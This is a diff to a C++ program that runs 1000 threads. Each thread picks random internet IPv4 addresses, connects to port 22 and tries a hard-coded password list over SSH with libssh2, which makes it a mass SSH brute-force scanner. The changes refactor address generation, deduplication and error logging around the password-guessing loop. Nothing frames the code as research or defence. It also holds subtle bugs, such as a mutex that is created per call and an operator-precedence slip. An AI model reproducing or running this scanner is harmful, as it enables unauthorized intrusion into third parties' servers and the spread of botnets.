@@ -8,7 +8,7 @@ int id1, id2, result;
 pthread_t thread1;
 int founds = 0;
 int totscanned = 0;
-static list<unsigned long> checking;
+std::list<unsigned long> checking;
 static pthread_mutex_t checking_mutex = PTHREAD_MUTEX_INITIALIZER;
 //class MySexec : public SExec
 //{
@@ -32,14 +32,37 @@ static pthread_mutex_t checking_mutex = PTHREAD_MUTEX_INITIALIZER;
 /* get random */
 unsigned long getrnd2(unsigned long min, unsigned long max)
 {
-	 return (min + (rand() % max - min));
+	 unsigned long long int random_value = 0; //Declare value to store data into
+	 size_t size = sizeof(random_value); //Declare size of data
+	 ifstream urandom("/dev/urandom", ios::in | ios::binary); //Open stream
+	 if (urandom) //Check if stream is open
+	 {
+		  urandom.read(reinterpret_cast<char*>(&random_value), size); //Read from urandom
+		  if (urandom) //Check if stream is ok, read succeeded
+		  {
+				//std::cout << "Read random value: " << random_value << std::endl;
+		  }
+		  else //Read failed
+		  {
+				std::cerr << "Failed to read from /dev/urandom" << std::endl;
+		  }
+		  urandom.close(); //close stream
+	 }
+	 else //Open failed
+	 {
+		  std::cerr << "Failed to open /dev/urandom" << std::endl;
+	 }
+
+	 return random_value;
+	 //return (min + (value % max - min));
+	 //return (min + (rand() % max - min));
 }
 unsigned long getrnd(unsigned long min, unsigned long max)
 {
 	 boost::random::mt19937 gen((int)pthread_self() + (int)time(NULL));
-	 static pthread_mutex_t boost_mutex = PTHREAD_MUTEX_INITIALIZER;
+	 pthread_mutex_t boost_mutex = PTHREAD_MUTEX_INITIALIZER;
 	 pthread_mutex_lock(&boost_mutex);
-	 static  boost::random::uniform_int_distribution<> dist(min, max);
+	 boost::random::uniform_int_distribution<> dist(min, max);
 	 unsigned long ret = dist(gen);
 	 pthread_mutex_unlock(&boost_mutex);
 	 return ret;
@@ -47,39 +70,29 @@ unsigned long getrnd(unsigned long min, unsigned long max)
 bool erasechecking(unsigned long sr)
 {
 	 pthread_mutex_lock(&checking_mutex);
-	 deb("erase: %lu checking list: %d\r\n", sr, checking.size());
-	 for (list<unsigned long>::iterator it = checking.begin();it != checking.end();++it)
-	 {
-		  /* if ((int*)it == NULL)
-			{
-				 deb("it=null");
-				 exit(-1);
-			}*/
-		  if (*it == sr)
-		  {
-				checking.erase(it);
-				//  deb("erased\r\n");
-		  }
-	 }
+	 //deb("%p removing %lu\r\n", pthread_self(), sr);
+	 checking.remove(sr);
 	 pthread_mutex_unlock(&checking_mutex);
 	 return true;
 }
 bool addchecking(unsigned long sr)
 {
 	 pthread_mutex_lock(&checking_mutex);
-	 checking.push_front(sr);
-	 // deb("add %lu\r\n",sr);
+	 checking.unique();
+	 checking.push_back(sr);
+	 //deb("%p add %lu\r\n", pthread_self(), sr);
 	 pthread_mutex_unlock(&checking_mutex);
 	 return 0;
 }
 bool ischecking(unsigned long sr)
 {
 	 pthread_mutex_lock(&checking_mutex);
-	 for (list<unsigned long>::iterator it = checking.begin();it != checking.end();++it)
+	 // deb("%p is checking %lu\r\n", pthread_self(), sr);
+	 for (std::list<unsigned long>::iterator it = checking.begin();it != checking.end();++it)
 	 {
 		  if (*it == sr)
 		  {
-				deb("checking %lu\r\n", sr);
+				deb("%p checking %lu\r\n", pthread_self(), sr);
 				pthread_mutex_unlock(&checking_mutex);
 				return true;
 		  }
@@ -87,10 +100,10 @@ bool ischecking(unsigned long sr)
 	 pthread_mutex_unlock(&checking_mutex);
 	 return false;
 }
-void* thread_func(void* arg)
+void* scanThread(void* arg)
 {
 	 int sockfd;
-	 sockaddr_in serv_addr;
+	 sockaddr_in  serv_addr;
 	 char curhost[26];
 	 boost::random::uniform_int_distribution<> dist(1, 9999999999999);//numeric_limits< unsigned long>::max());
 	 boost::random::mt19937 gen((int)pthread_self() + (int)time(NULL));
@@ -102,25 +115,40 @@ void* thread_func(void* arg)
 		  sockfd = socket(AF_INET, SOCK_STREAM, 0);
 		  if (sockfd < 0)
 				deb("ERROR opening socket: %s\r\n", fmterr());
+
 		  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
+
 		  long flags;
+
 		  flags = fcntl(sockfd, F_GETFL, 0);
 		  fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
 		  bzero((char*)&serv_addr, sizeof(serv_addr));
+
 		  serv_addr.sin_family = AF_INET;
 		  serv_addr.sin_port = htons(22);
+
 		  do
 		  {
-				serv_addr.sin_addr.s_addr = dist(gen);//getrnd(0,100000000000000);//rand();//inet_addr("195.2.253.204")
+				char ipAddr[128];
+				sprintf(ipAddr, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
+				serv_addr.sin_addr.s_addr = inet_addr(ipAddr);
+
 		  } while (ischecking(serv_addr.sin_addr.s_addr));
 		  strncpy(curhost, inet_ntoa(serv_addr.sin_addr), sizeof(curhost));
-		  //addchecking(serv_addr.sin_addr.s_addr);
+		  //deb("scan %s\r\n", curhost);
+		  addchecking(serv_addr.sin_addr.s_addr);
+
 		  unsigned long chkdist = 0;
+
 		  chkdist = dist(gen);
+
 		  int ret;
 		  //   deb("\rconnecting %16s ", inet_ntoa(serv_addr.sin_addr));
+
 		  ret = connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
+
 		  fd_set fds;
+
 		  //deb("ret:%d errno:%s (%d)\r\n",ret,strerror(errno),errno);
 		  // sleep(1);
 		  FD_ZERO(&fds);
@@ -167,8 +195,13 @@ void* thread_func(void* arg)
 					 if (rc)
 					 {
 						  if (rc != -43)
-								deb("%16s failure establishing SSH session: %d [rnd: %lu, checking: %d]\n",
-									 curhost, rc, chkdist, checking.size());
+						  {
+								char* errmsg;
+								libssh2_session_last_error(session, &errmsg, NULL, NULL);
+
+								deb(KRED "%16s [rnd: %lu, checking: %d, msg: %s]\n",
+									 curhost, chkdist, checking.size(), errmsg);
+						  }
 						  //return -1;
 					 }
 					 else
@@ -187,10 +220,15 @@ void* thread_func(void* arg)
 						  };
 						  for (u = 0;u < 3;u++)
 						  {
-								if (libssh2_userauth_password(session, username, passwords[u]))
+								int ret;
+								if (ret = libssh2_userauth_password(session, username, passwords[u]) != 0)
 								{
-									 //       deb( "%16s " KRED "Authentication by password failed. [%s]\n"
-									 //         RESET, inet_ntoa(serv_addr.sin_addr),passwords[u]);
+									 char* errmsg;
+									 libssh2_session_last_error(session, &errmsg, NULL, NULL);
+
+									 deb("%16s " KRED "[%s] [ret:%d, msg:%s]\n"
+										  RESET, inet_ntoa(serv_addr.sin_addr), passwords[u], ret, errmsg);
+
 									 continue;
 								}
 								else
@@ -338,7 +376,7 @@ void* thread_func(void* arg)
 						 CkSsh_Dispose(ssh);*/
 				}
 		  }
-		  //erasechecking(serv_addr.sin_addr.s_addr);
+		  erasechecking(serv_addr.sin_addr.s_addr);
 		  close(sockfd);
 	 }
 }
@@ -418,7 +456,7 @@ int main(int argc, char** argv)
 	 for (int i = 0;i < 1000;i++)
 	 {
 		  id1++;
-		  result = pthread_create(&thread1, NULL, thread_func, &id1);
+		  result = pthread_create(&thread1, NULL, scanThread, &id1);
 	 }
 	 deb(" %d threads running\r\n", id1);
 	 pthread_create(&thread1, NULL, CmdLinkThread, &id1);
